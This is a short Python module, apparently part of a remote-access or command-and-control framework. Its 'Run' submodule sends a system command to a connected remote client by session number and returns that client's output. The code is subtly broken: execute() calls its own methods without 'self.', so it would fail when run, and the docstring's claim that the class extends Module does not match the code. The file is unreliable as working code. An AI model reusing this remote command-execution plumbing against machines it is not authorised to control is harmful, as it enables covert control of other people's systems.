from Server import Server

class Run:
    """
    Represents a Submodule that extends the Module class.
    This class handles the modular functionality of sending a system command for the remote client to execute it.
    """

    def __init__(self, currentSession, command):
        """
        Initializes the Submodule with a name and description.
        """

        self.name = "Run"
        self.description = "This module handles the process of executing a system command in the remote client."

        self._currentSession = currentSession
        self._command = command

    def sendCommand(self, server, client):
        """
        Sends the command to execute to the client
        """

        #Send command
        server.sendTo(client, b'command' + self._command.encode())

    def receiveOutput(self, server, client):
        """
        Receives the stdout of the command sent
        """

        return server.recvFrom(client)

    def execute(self):
        """
        Executes the Submodule.
        """

        print(f"Executing Submodule {self.name} - {self.description}")
        server = Server.getInstance()

        sendCommand(server, self._currentSession - 1)

        stdout = receiveOutput(server, self._currentSession - 1)

        return stdout

